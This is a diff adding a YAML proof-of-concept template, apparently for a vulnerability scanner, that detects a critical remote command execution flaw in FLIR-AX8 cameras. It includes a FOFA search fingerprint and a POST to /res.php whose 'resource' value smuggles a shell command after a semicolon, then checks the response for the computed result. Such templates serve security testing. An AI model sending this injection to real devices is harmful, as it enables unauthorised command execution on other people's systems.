@@ -1,0 +1,26 @@
+id: poc-yaml-flir-ax8-res-rce
+info:
+  name: FLIR-AX8 res.php 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: FLIR-AX8
+  fofa: app="FLIR-FLIR-AX8"
+variables:
+  t1: random_int(111000,999000)
+  t2: random_int(10,100)
+  t3: t1 - t2
+requests:
+- method: POST
+  path: /res.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: action=node&resource=1;expr {{.t1}} - {{.t2}}
+  expression: 'status_code == 200 &&
+
+    contains(body,t3) &&
+
+    contains(body,"bad data")
+
+    '
+transport: http
